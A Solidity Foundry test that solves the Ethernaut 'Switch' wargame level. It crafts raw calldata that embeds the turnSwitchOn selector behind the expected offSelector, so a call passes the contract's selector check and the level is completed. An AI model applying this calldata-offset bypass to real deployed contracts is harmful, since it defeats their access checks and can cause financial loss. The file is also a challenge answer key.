// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/29-Switch/SwitchFactory.sol";
import "../src/Ethernaut.sol";

contract SwitchTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testSwitchHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        SwitchFactory factory = new SwitchFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        Switch level = Switch(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        bytes memory switch_sig = abi.encodeWithSignature("turnSwitchOn()");
        console.logBytes(switch_sig);

        bytes memory try_sig = abi.encodeWithSignature("flipSwitch(bytes)",switch_sig,"spacer",level.offSelector());
        console.logBytes(try_sig);

        levelAddress.call(try_sig);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}